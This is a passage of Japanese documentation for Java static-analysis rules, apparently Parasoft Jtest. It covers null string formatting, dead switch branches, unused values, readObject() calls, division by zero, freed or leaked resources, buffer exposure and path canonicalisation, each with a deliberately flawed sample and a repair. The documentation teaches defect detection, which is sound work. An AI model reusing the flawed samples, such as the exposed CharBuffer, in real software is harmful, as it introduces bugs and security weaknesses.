   * java.io.PrintStream.format
   * java.io.PrintStream.printf
   * java.io.PrintStream.print
   * java.io.PrintStream.println
   * java.lang.String.format
   * java.lang.StringBuilder.append
   * java.lang.StringBuilder.insert
   * java.lang.StringBuffer.append
   * java.lang.StringBuffer.insert


</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v9.1


</PRE>
<STRONG>
注意
</STRONG>
<PRE>
ルールは null 値が上記のメソッドに渡され、文字列に追加されているすべてのケースを
検出します。null 値が意図的に文字列に追加されている場合、レポートされた違反を抑制
する必要があります。



</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>

[null チェックによって変数が null であることが分かっている場合に違反をレポート] パラメーターグループ
は、nullチェックの方法を指定します。
   * オフの場合、null 値が代入されていることが確実な変数に対してだけ違反がレポートされます。
   * オンの場合、null 値が代入されている場合だけでなく、null チェックによって使用時点での null 値の追加
      が確実な場合にも違反がレポートされます。
            
次は、2 番目の違反の例です。

    boolean b = (obj == null); // null チェックにより、違反の箇所での null 値の付加が明らか
    ...
    if (b) {
        ...
        System.out.printf("Object value: %s", obj); // チェックボックスがオンの場合、違反がレポートされる
    }


[次の可視性の呼び出し先メソッドで null チェックが行われている場合を除く]
このパラメーターを使用すると、null チェックにより意図しない違反が多数レポート
されるのを軽減できます。このオプションを使用すると、null チェック時に無視する
メソッドを可視性に基づいて指定できます。以下の可視性を指定できます。
   * [public] 
   * [public、protected]
   * [public、protected、package-private] (デフォルト)
   * [任意の可視性]

次の表は、foo() の可視性とパラメーターの組み合わせによるルールの振る舞いの違いを
説明しています。
違反は表中の '+' 印の組み合わせだけにレポートされます。
	                                                       メソッドの可視性 (foo)
パラメーター:                         | public | protected | protected internal | internal | private |
チェックボックス オフ                 |    +   |     +     |         +          |    +     |    +    |
"public"                              |    -   |     +     |         +          |    +     |    +    |
"public、protected"                   |    -   |     -     |         -          |    +     |    +    |
"public、protected、package-private"  |    -   |     -     |         -          |    -     |    +    |
"任意の可視性"                        |    -   |     -     |         -          |    -     |    -    |


次のコードを例として説明します。

    class Example
    {
        protected void foo(Object obj)
        {
            if (obj != null) {
                ...
            }
        }

        void bar(Object obj)
        {
            foo(obj);
            System.out.printf("Object value: %s", obj); // 違反がレポートされるか?
        }
    }

bar() の内部で違反がレポートされるべきでしょうか? 答えは、foo() の可視性と
ルールのパラメーター設定によって異なります。
foo() は protected メソッドであるため、デフォルトのパラメーター設定が使用された
場合は、bar() では違反はレポートされません。


[潜在的な NULL の返却] チェックボックス グループ
解析時に、特定のメソッドが NULL 値を返す可能性を考慮するかどうかを指定します。
現在、このオプションは Java の標準パッケージ java.lang および java.io, java.util
のメソッド用に実行されています。
次の 1 つ以上のオプションを有効にできます。

   1 [NULL を返す可能性があり、防止するのが困難な J2SE メソッドを考慮する]
     NULL を返す可能性があり、NULL を返すのを防ぐのが難しいメソッド。
     クライアント コードは戻り値が NULL 以外であることを期待できないため、必要に
     応じて適切なチェックを行う必要があります。

   2 [NULL を返す可能性があるが、防止するのは困難ではない J2SE メソッドを考慮する]
     NULL を返す可能性があるが、NULL を返さないようにコードを記述することが可能な
     メソッド。この場合、戻り値のチェックは必須ではありません。

   3 [J2SE Collection の getter が NULL を返却できるものとする]
     NULL を返す可能性のある Collection のアクセス メソッド

[null を返す可能性のある外部関数] パラメーターを使用すると、戻り値が NULL として扱われる追加の
メソッドを定義できます。

ｰ [有効] メソッドを有効または無効にします。無効化すると、ルールは null を返す可能性のあるメソッドとして扱いません。

- [完全修飾型名 (ワイルドカード)] 列にはメソッドを宣言する型の完全修飾名を指定する必要があります。
任意の型で宣言されたメソッドを指定するには '*' を使用します。

- [メソッド名 (ワイルドカード)] 列にはメソッドの名前を指定します。

- [+ サブクラスの定義] 列は、指定されたクラスのサブクラスで定義されている指定された名前のメソッド
に対してこの列の設定を適用するかどうかを指定します。この設定は、インスタンス メソッドおよび
非インスタンスメソッドの両方に適用されることに注意してください。    
 
[未検証の違反をレポートする] パラメーターをオンにすると、より多くの違反をレポート
できますが、誤検出の数も増える可能性があります。このパラメーターがオンの場合、
フロー解析は、違反に至るパスが関数の先頭から到達可能かどうかをチェックしません。
一部の複雑なケースでは、解析の深さの制限によって、フロー解析が違反の検証処理を
完了できない場合があります。その場合、このパラメーターがオンになっているときにだけ、
違反が検出されます。


</PRE>
<STRONG>
利点
</STRONG>
<PRE>
予期しない書式の文字列を検出するのに役立ちます。


</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

public class Example
{
    public void printSummary(int count)
    {
        String descriptor = getDescriptor(count);
        System.out.printf("Selection descriptor: %s; Count: %d", descriptor, count); // 違反
    }

    private String getDescriptor(int count)
    {
        String descriptor = null;
        if (count != 0) {
            // compute the descriptor 
        }
        return descriptor;
    }
}



</PRE>
<STRONG>
修正
</STRONG>
<PRE>
デフォルト値で変数を初期化することで、上のサンプルを修正します。

public class Repair
{
    public void printSummary(int count)
    {
        String descriptor = getDescriptor(count);
        System.out.printf("Selection descriptor: %s; Count: %d", descriptor, count); // 違反ではない
    }

    private String getDescriptor(int count)
    {
        String descriptor = "default descriptor";
        if (count != 0) {
            // compute the descriptor
        }
        return descriptor;
    }
}

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.PB.SWITCH" href="#top">[Top]</a><br/><br/><STRONG>
switch 文には到達できないブランチがあってはならない [BD.PB.SWITCH]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>
このルールは、到達不可能な switch 文のブランチ、つまりデッド コードの一種を
検出します。
デッド コードは、リファクタリングの過程や、コードが発展する際によく見られます。
とくに、複数の開発者がコードを編集している場合にあてはまります。下の「サンプル 
コード」の項で示すように、到達不可能な switch 文のブランチの存在は、コードの
論理的な誤りを示唆することがよくあります。


</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v8.1


</PRE>
<STRONG>
注意
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>
明示的に宣言されていない default ブランチが到達不可能な場合に、違反を
レポートするかどうかを指定できます。[到達不可能なdefaultブランチが
明示的に定義されていない場合でも違反をレポートする] チェック ボックスに
よって設定します。


</PRE>
<STRONG>
利点
</STRONG>
<PRE>
コードを整った状態に保ち、論理の矛盾が発生したらすぐに取り除くことができます。


</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>
次のサンプルに対し違反がレポートされます。

public class Example
{
    public void guessFigure(boolean round, boolean volumetric)
    {
        final int figure;
        if (round &amp;&amp; volumetric) {
            figure = SPHERE;
        } else if (round &amp;&amp; !volumetric) {
            figure = CIRCLE;
        } else if (!round &amp;&amp; volumetric) {
            figure = CUBE;
        } else {
            figure = SQUARE;
        }

        switch (figure) { // 違反 - 到達不可能なブランチ 'HEMISPHERE'
            case SPHERE:
                System.out.println("This is a sphere");
                break;
            case HEMISPHERE:
                System.out.println("This is a hemisphere");
                break;
            case CIRCLE:
                System.out.println("This is a circle");
                break;
            case CUBE:
                System.out.println("This is a cube");
                break;
            default:
                System.out.println("This is a square");
                break;
        }
    }

    private final static int SPHERE = 0;

    private final static int HEMISPHERE = 1;

    private final static int CIRCLE = 2;

    private final static int CUBE = 3;

    private final static int SQUARE = 4;
}


</PRE>
<STRONG>
修正
</STRONG>
<PRE>
到達不可能なブランチを削除します。

public class Repair
{
    public void guessFigure(boolean round, boolean volumetric)
    {
        final int figure;
        if (round &amp;&amp; volumetric) {
            figure = SPHERE;
        } else if (round &amp;&amp; !volumetric) {
            figure = CIRCLE;
        } else if (!round &amp;&amp; volumetric) {
            figure = CUBE;
        } else {
            figure = SQUARE;
        }

        switch (figure) { // 違反ではない
            case SPHERE:
                System.out.println("This is a sphere");
                break;
            case CIRCLE:
                System.out.println("This is a circle");
                break;
            case CUBE:
                System.out.println("This is a cube");
                break;
            default:
                System.out.println("This is a square");
                break;
        }
    }

    private final static int SPHERE = 0;

    private final static int HEMISPHERE = 1;

    private final static int CIRCLE = 2;

    private final static int CUBE = 3;

    private final static int SQUARE = 4;
}


</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

CWE-561: Dead Code
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/561.html">https://cwe.mitre.org/data/definitions/561.html</A>

Tags: CWE

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.PB.VOVR" href="#top">[Top]</a><br/><br/><STRONG>
未使用の値を避ける [BD.PB.VOVR]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>

このルールは、変数に値が代入されているが使用されていない場合に
違反をレポートします。
 


</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v10.1


</PRE>
<STRONG>
注意
</STRONG>
<PRE>
実際のメソッド内にある値だけが解析されます。より大きなスコープで値が
代入されている場合 (クラス フィールドの場合など)、
値はチェックされません。
ルールは、他のメソッドの呼び出しで使用されている値は、チェック対象のメソッド
内で使用されていなくても、使用されているとみなします。BD-PB-POVR ルールを
有効にすると、メソッド パラメーターの不適切な使用がチェックされます。
プリミティブ型の定数値は無視されます。
このルールは、参照に null が代入された場合は違反をレポートしません。


</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>
パラメーター
[プリミティブ型の変数宣言に対して違反をレポートする] : このパラメーターが
オンの場合、変数にプリミティブ型定数が代入された後、変数が存在するすべての
パスで値が上書きされているために、値が使用されないプリミティブ型変数の宣言
に対して違反をレポートします。
デフォルト値はオフです。


</PRE>
<STRONG>
利点
</STRONG>
<PRE>
未使用の値があることは、コードの品質が良くないか、プログラムにバグが
あることを表します。


</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

public abstract class Example
{
    abstract int fun1();

    abstract int fun2();

    int fun(int a)
    {
        int b;
        if (a &gt; 0) {
            b = fun1(); // 違反
        }
        b = fun2();
        return b;
    }
}


</PRE>
<STRONG>
修正
</STRONG>
<PRE>

public abstract class Repair
{
    abstract int fun1();

    abstract int fun2();

    int fun(int a)
    {
        if (a &gt; 0) {
            return fun1();
        }
        return fun2();
    }
}


</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

CWE-563: Assignment to Variable without Use
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/563.html">https://cwe.mitre.org/data/definitions/563.html</A>

Tags: CWE

</PRE>
<STRONG>
ログ
</STRONG>
<PRE>
@deprecated UC.DEAD


</PRE><br/><hr/><br/><a class="notPrintable" id="BD.PB.VREADOBJ" href="#top">[Top]</a><br/><br/><STRONG>
readObject() メソッドからオーバーライド可能なメソッドを呼び出さない [BD.PB.VREADOBJ]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>
このルールは、this オブジェクトの readObject() メソッドから、オーバーライド可能な
メソッドが呼び出されている場合に違反をレポートします。
「readObject() メソッドからオーバーライド可能なメソッドを呼び出すと、オーバーライドする
メソッドはオブジェクトの状態が完全に初期化される前にアクセスできてしまいます。このような
早まったアクセスが可能になる理由は、デシリアライズでは、readObject がオブジェクト
コンストラクターの役割をするため、readObject を出るまでオブジェクトの初期化が完了しない
からです。」
[SEI CERT Oracle Coding Standard for Java; SER09-J. Do not invoke overridable methods 
from the readObject() method]


</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v10.4


</PRE>
<STRONG>
注意
</STRONG>
<PRE>
N/A 


</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>
「readObject() メソッドからオーバーライド可能なメソッドを呼び出すと、初期化エラーに
つながる可能性があります。」
[SEI CERT Oracle Coding Standard for Java; SER09-J. Do not invoke overridable 
methods from the readObject() method]


</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>
[抽象メソッドの呼び出しだけをレポートする] パラメーターがオンの場合、readObject() メソッドから
抽象関数が呼び出された場合にだけ違反がレポートされ、他の関数呼び出しは無視されます。

[defaultReadObject() の呼び出し後のオーバーライド可能なメソッドへの呼び出しをレポート] 
パラメーターがオンの場合、defaultReadObject() メソッドの呼び出しの後にオーバーライド可能な
メソッドが呼び出された場合に違反をレポートします。パラメーターがオフの場合、このような
ケースに対して違反はレポートされません。


</PRE>
<STRONG>
利点
</STRONG>
<PRE>
初期化エラーを防ぐのに役立ちます。


</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

public class Example
{
    private void readObject(final ObjectInputStream stream)
        throws IOException, ClassNotFoundException
    {
        stream.defaultReadObject();
        overridableMethod(); // 違反
    }

    public void overridableMethod()
    {}
}


</PRE>
<STRONG>
修正
</STRONG>
<PRE>
オーバーライド可能なメソッドへの呼び出しを削除します。
呼び出しを削除できない場合、メソッドを private または final 宣言します。

public class Repair
{
    private void readObject(final ObjectInputStream stream)
        throws IOException, ClassNotFoundException
    {
        stream.defaultReadObject();
    } // 違反ではない
}


</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

SEI CERT Oracle Coding Standard for Java
SER09-J. Do not invoke overridable methods from the readObject() method
<A target="_blank" HREF="https://wiki.sei.cmu.edu/confluence/display/java/SER09-J.+Do+not+invoke+overridable+methods+from+the+readObject%28%29+method">https://wiki.sei.cmu.edu/confluence/display/java/SER09-J.+Do+not+invoke+overridable+methods+from+the+readObject%28%29+method</A>

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.PB.ZERO" href="#top">[Top]</a><br/><br/><STRONG>
ゼロによる除算を避ける [BD.PB.ZERO]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>
このルールは、除算でゼロが除数として使用される可能性がある
パスを検出します。0 による除算を行うと、ArithmeticException が
スローされ、結果として実行時の予期しない動作の原因になる可能性
があります。


</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v8.1


</PRE>
<STRONG>
注意
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>

[Sensitive mode] パラメーターを使用すると、除数がゼロである可能性がある場合に
違反をレポートできます。
このオプションをオンにすると、フロー解析は実際にゼロによる除算が発生する場合だけで
なく、ゼロ除算の可能性がある場合 (実際には発生しない場合もある) にも違反を
検出します。結果として、より多くの違反がレポートされます。

このオプションは、デフォルトではオフです。


</PRE>
<STRONG>
利点
</STRONG>
<PRE>
このルールを適用すると、ゼロ除算エラーにより実行時に予期しない結果が
起こるのを防ぐのに役立ちます。


</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

public class Example
{
    int test(boolean condition, int value)
    {
        return value / getValue(condition); // 違反
    }

    int getValue(boolean condition)
    {
        return condition ? 10 : 0;
    }
}



</PRE>
<STRONG>
修正
</STRONG>
<PRE>
除数がゼロの可能性がある場合、除数がゼロでないことを確認する
手段を追加します。

public class Repair
{
    int test(boolean condition, int value)
    {
        int denominator = getValue(condition);
        if (denominator != 0) {
            return value / denominator; // 違反ではない
        } else {
            int defaultDenominator = 5;
            return value / defaultDenominator; // 違反ではない
        }
    }

    int getValue(boolean condition)
    {
        return condition ? 10 : 0;
    }
}

教育とトレーニング

Numeric Errors
Video: <A target="_blank" HREF="https://vimeo.com/238779116">https://vimeo.com/238779116</A>
PDF: <A target="_blank" HREF="http://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_2-Numeric-Errors.pdf">http://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_2-Numeric-Errors.pdf</A>



</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

CWE-369: Divide By Zero
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/369.html">https://cwe.mitre.org/data/definitions/369.html</A>

SEI CERT Oracle Coding Standard for Java
NUM02-J. Ensure that division and remainder operations do not result in divide-by-zero errors
<A target="_blank" HREF="https://wiki.sei.cmu.edu/confluence/display/java/NUM02-J.+Ensure+that+division+and+remainder+operations+do+not+result+in+divide-by-zero+errors">https://wiki.sei.cmu.edu/confluence/display/java/NUM02-J.+Ensure+that+division+and+remainder+operations+do+not+result+in+divide-by-zero+errors</A>

Java Platform, Standard Edition (Java SE) 8
ArithmeticException
<A target="_blank" HREF="https://docs.oracle.com/javase/8/docs/api/java/lang/ArithmeticException.html">https://docs.oracle.com/javase/8/docs/api/java/lang/ArithmeticException.html</A>

Tags: CWE, CERT

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.RES.FREE" href="#top">[Top]</a><br/><br/><STRONG>
解放されたリソースを使用してはならない [BD.RES.FREE]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>
このルールは、解放済みのリソースを使用している場合に違反をレポートします。解放済みのリソースへの
参照が以下のように使用されている場合に違反をレポートします。

   * 関数から返されている
   * 関数の引数として渡されている
   * 比較演算 (==、!=) で使用されている
   * 間接参照されている
   * 変数/フィールド/配列要素に代入されている


</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v9.1


</PRE>
<STRONG>
注意
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>
[解放されたリソースを指す参照と null 値が比較された場合に違反をレポートする] チェックボックス
解放されたリソースを指す参照と null 値が比較された場合の違反をレポートするか抑制するかを指定
します。これが許されるかどうかは、コーディング ポリシーやアプリケーションの設計によります。
デフォルトでは、このような違反はレポートされません。

[解放されたリソースを指す参照と別の参照が比較された場合に違反をレポートする] チェックボックス
解放されたリソースの参照と別の参照が比較された場合の違反をレポートするか抑制するかを指定
します。これが許されるかどうかは、コーディング ポリシーやアプリケーションの設計によります。
デフォルトでは、このような違反はレポートされません。

[未検証の違反をレポートする] パラメーターをオンにすると、より多くの違反をレポート
できますが、誤検出の数も増える可能性があります。このパラメーターがオンの場合、
フロー解析は、違反に至るパスが関数の先頭から到達可能かどうかをチェックしません。
一部の複雑なケースでは、解析の深さの制限によって、フロー解析が違反の検証処理を
完了できない場合があります。その場合、このパラメーターがオンになっているときにだけ、
違反が検出されます。

このルールの対象とするリソースのタイプは、テスト コンフィギュレーション画面で参照および編集できます。
[静的解析] -&gt; [フロー解析詳細設定] -&gt; [リソース]


</PRE>
<STRONG>
利点
</STRONG>
<PRE>
解放されたリソースを使用したことによる、毎回同じように表れるとは限らない、分かりにくい
エラーを防ぎます。


</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

import java.io.PrintStream;

public class Example
{
    void outputData(PrintStream ps, String data)
    {
        // do something
        ps.print(data);
        ps.close();
    }

    void process(PrintStream ps)
    {
        // do something
        outputData(ps, "Some data");
        ps.print("Some text"); // 違反
    }
}


</PRE>
<STRONG>
修正
</STRONG>
<PRE>

import java.io.PrintStream;

public class Repair
{
    void outputData(PrintStream ps, String data)
    {
        // do something
        ps.print(data);
    }

    void process(PrintStream ps)
    {
        // do something
        outputData(ps, "Some data");
        ps.print("Some text"); // 違反ではない
    }

}


</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

2020 CWE Top 25 Most Dangerous Software Errors
CWE-20: Improper Input Validation
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/20.html">https://cwe.mitre.org/data/definitions/20.html</A>

2020 CWE Top 25 Most Dangerous Software Errors
CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/119.html">https://cwe.mitre.org/data/definitions/119.html</A>

2020 CWE Top 25 Most Dangerous Software Errors
CWE-416: Use After Free
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/416.html">https://cwe.mitre.org/data/definitions/416.html</A>

Tags: CWE

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.RES.LEAKS" href="#top">[Top]</a><br/><br/><STRONG>
リソースが割り当て解除されていることを確認する [BD.RES.LEAKS]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>
このルールは、割り当てられたリソースが、すべてのパスで割り当て解除されることを
保証するのに役立ちます。このルールの違反は、アプリケーション中でリソースがリーク
している実行パスを表します。


</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v8.0


</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>
カテゴリ: アプリケーションの誤動作

リソースをクローズし忘れると、リソースの枯渇を招く恐れがあります。
リソースの枯渇はセキュリティに影響する場合があります。


</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>

[次の型のサードパーティのメソッドによってリソースへの参照が格納される可能性があると仮定する:]
パラメーターを使用して、リソースへの参照がサードパーティのメソッドによって
格納される可能性がある場合に、どの程度厳密にチェックするかを指定できます。
例えば、SpecialCollection.add() というサードパーティのメソッド があり、
このメソッドへのパラメーターとしてリソースが渡される場合、リソースが
Collection に格納され、後に Collection の反復処理によってクローズされる
可能性があります。フロー解析にはサードパーティのメソッドの正確な振る舞いが
わからないため、次のいずれかの方法で動作します。

   * [任意のメソッド] パラメーターがオンの場合 (デフォルト値)、フロー解析は、任意のサードパーティの
     メソッドにリソースが渡された場合、メソッドがリソースへの参照を格納する可能性が
     あると仮定します。このように設定すると、格納された参照を使用して後でリソースが
     クローズされている場合に、違反が誤検出されるのを防ぎます。しかし、この設定では
     実際のリークが違反として検出されない場合もあります。
     
   * [名前が次のパターンに一致するメソッド] パラメーターがオンの場合、フロー解析は、正規表現に一致する
     任意のサードパーティのメソッドにリソースが渡された場合、メソッドがリソースへの参照を格納する
     可能性があると仮定します。このように設定すると、格納された参照を使用して後でリソースが
     クローズされている場合に、違反が誤検出されるのを防ぎます。しかし、この設定では
     メソッドがリソースへの参照を格納していない場合、実際のリークが違反として検出されないこともあります。

   * すべてのパラメーターをオフにするとフロー解析は、より積極的なアプローチを採り、
     サードパーティのメソッドがリソースには影響しないと仮定します。このアプローチ
     では誤検出の能性がありますが、デフォルトのアプローチでは見逃される
     可能性のある実際のリークを見落とすことはありません。

[未検証の違反をレポートする] パラメーターをオンにすると、より多くの違反をレポート
できますが、誤検出の数も増える可能性があります。このパラメーターがオンの場合、
フロー解析は、違反に至るパスが関数の先頭から到達可能かどうかをチェックしません。
一部の複雑なケースでは、解析の深さの制限によって、フロー解析が違反の検証処理を
完了できない場合があります。その場合、このパラメーターがオンになっているときにだけ、
違反が検出されます。

このルールの対象とするリソースのタイプは、テスト コンフィギュレーション画面で参照および編集できます。
[静的解析] -&gt; [フロー解析詳細設定] -&gt; [リソース]


</PRE>
<STRONG>
利点
</STRONG>
<PRE>
リソースにクローズに関して厳しいポリシーを適用すると、リソースの枯渇を防ぎ、アプリケーションを
より堅牢にするのに役立ちます。


</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

import java.io.FileInputStream;
import java.io.InputStream;
import java.net.Socket;

public abstract class Example
{
    public String readData(String sRequest)
    {
        String sResult = null;
        int type = getRequestType(sRequest);
        try {
            InputStream input = getSource(sRequest, type);
            byte[] bytes = new byte[256];
            input.read(bytes, 0, bytes.length);
            sResult = new String(bytes);
        } catch (Exception e) {
            System.out.println("Cannot read data");
        }
        return sResult; // このポイントで入力ストリームへの参照が失われ、クローズされないまま残る
    } // 違反

    public InputStream getSource(String sLocation, int type)
        throws Exception
    {
        InputStream source = null;
        switch (type) {
            case 1:
                source = _socket.getInputStream();
                break;
            default:
                source = new FileInputStream("...");
        }
        return source;
    }

    Socket _socket;

    protected abstract int getRequestType(String sRequest);
}


</PRE>
<STRONG>
修正
</STRONG>
<PRE>
ストリームをクローズします。

import java.io.FileInputStream;
import java.io.InputStream;
import java.net.Socket;

public abstract class Repair
{
    public String readData(String sRequest)
    {
        String sResult = null;
        int type = getRequestType(sRequest);
        try (InputStream input = getSource(sRequest, type)) {
            byte[] bytes = new byte[256];
            input.read(bytes, 0, bytes.length);
            sResult = new String(bytes);
        } catch (Exception e) {
            System.out.println("Cannot read data");
        }
        return sResult;
    } // 違反ではない
    public InputStream getSource(String sLocation, int type)
        throws Exception
    {
        InputStream source = null;
        switch (type) {
            case 1:
                source = _socket.getInputStream();
                break;
            default:
                source = new FileInputStream("...");
        }
        return source;
    }

    Socket _socket;

    protected abstract int getRequestType(String sRequest);
}


</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

2020 CWE Top 25 Most Dangerous Software Errors
CWE-400: Uncontrolled Resource Consumption
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/400.html">https://cwe.mitre.org/data/definitions/400.html</A>

CWE-459: Incomplete Cleanup
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/459.html">https://cwe.mitre.org/data/definitions/459.html</A>

CWE-771: Missing Reference to Active Allocated Resource
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/771.html">https://cwe.mitre.org/data/definitions/771.html</A>

CWE-772: Missing Release of Resource after Effective Lifetime
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/772.html">https://cwe.mitre.org/data/definitions/772.html</A>

SEI CERT Oracle Coding Standard for Java
FIO04-J. Release resources when they are no longer needed
<A target="_blank" HREF="https://wiki.sei.cmu.edu/confluence/display/java/FIO04-J.+Release+resources+when+they+are+no+longer+needed">https://wiki.sei.cmu.edu/confluence/display/java/FIO04-J.+Release+resources+when+they+are+no+longer+needed</A>

SEI CERT Oracle Coding Standard for Java
MSC04-J. Do not leak memory
<A target="_blank" HREF="https://wiki.sei.cmu.edu/confluence/display/java/MSC04-J.+Do+not+leak+memory">https://wiki.sei.cmu.edu/confluence/display/java/MSC04-J.+Do+not+leak+memory</A>

Tags: CWE, CERT

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.SECURITY.BUFEXP" href="#top">[Top]</a><br/><br/><STRONG>
バッファーによってラップされたデータを信頼されていないコードに公開しない [BD.SECURITY.BUFEXP]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>
﻿説明
このルールは、バッファーでラップされたデータが公開されている場合に違反をレポートします。
IntBuffer、CharBuffer、ByteBuffer などの java.nio パッケージに定義されたバッファー クラスには、
対応するプリミティブ データ型の配列をラップし、Buffer オブジェクトとしてバッファーを返す 
wrap() メソッドが定義されています。同様に、duplicate() および slice() メソッドは、ラップされた
元の配列から追加のバッファーを作成します。
返されたバッファーを変更すると元の配列が変更され、また配列を変更するとバッファーも変更されます。


</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v10.2.2


</PRE>
<STRONG>
注意
</STRONG>
<PRE>
このルールは、ラップされた配列または複製されたバッファーが返されているかどうかだけをチェックします。
それが意図された振る舞いであり、問題がない場合もあります。また、すでに読み取り専用であるバッファーは
複製しても危険ではありませんが、その場合にも違反がレポートされます。


</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>
カテゴリ: 機密データの公開

wrap()、duplicate()、slice() メソッドを使用して作成したバッファーを公開すると、信頼できない
呼び出し側が元のデータの内容を変更する可能性があります。


</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>
[未検証の違反をレポート] パラメーターをオンにすると、より多くの違反がレポートされる
可能性がありますが、誤検出の可能性も大きくなります。このモードでは、フロー解析は
関数の先頭から違反のパスに到達できるかどうかをチェックしません。複雑なケースでは、
解析の深さを制限すると、違反の検証処理を完了できない場合があります。その場合、違反は
このパラメーターがオンの場合にだけレポートされます。


</PRE>
<STRONG>
利点
</STRONG>
<PRE>
悪意のある攻撃からコードを防御するのに役立ちます。


</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

import java.nio.CharBuffer;

public class Example
{
    private char[] dataArray;

    public CharBuffer getBufferCopy()
    {
        return CharBuffer.wrap(dataArray); // 違反
    }

    CharBuffer cb;

    public CharBuffer getBufferDuplicate()
    {
        return cb.duplicate(); // 違反
    }
}


</PRE>
<STRONG>
修正
</STRONG>
<PRE>
コードを修正するには、バッファーの読み取り専用ビューを返します。

import java.nio.CharBuffer;

public class Repair
{
    private char[] dataArray;

    public CharBuffer getBufferCopy()
    {
        return CharBuffer.wrap(dataArray).asReadOnlyBuffer(); // 違反ではない
    }

    CharBuffer cb;

    public CharBuffer getBufferDuplicate()
    {
        return cb.asReadOnlyBuffer(); // 違反ではない
    }
}


</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

SEI CERT Oracle Coding Standard for Java
FIO05-J. Do not expose buffers or their backing arrays methods to untrusted code
<A target="_blank" HREF="https://wiki.sei.cmu.edu/confluence/display/java/FIO05-J.+Do+not+expose+buffers+or+their+backing+arrays+methods+to+untrusted+code">https://wiki.sei.cmu.edu/confluence/display/java/FIO05-J.+Do+not+expose+buffers+or+their+backing+arrays+methods+to+untrusted+code</A>

Tags: CERT

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.SECURITY.CANPATH" href="#top">[Top]</a><br/><br/><STRONG>
パスを標準化してから検証するべきである [BD.SECURITY.CANPATH]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>
﻿説明

このルールは、正規パスではなく絶対ファイル パスに対して検証が行われている場合に違反をレポート
します。

以下のいずれかのメソッドから返されたファイル パスが検証メソッドに渡されている場合に
違反がレポートされます。
1. java.io.File クラスのメソッド:
	* String getAbsolutePath()

2. 'File getAbsoluteFile()' メソッドによって java.io.File から取得された java.io.File クラスのメソッド:
	* String getPath()
	* String getAbsolutePath()
	


</PRE>
<STRONG>
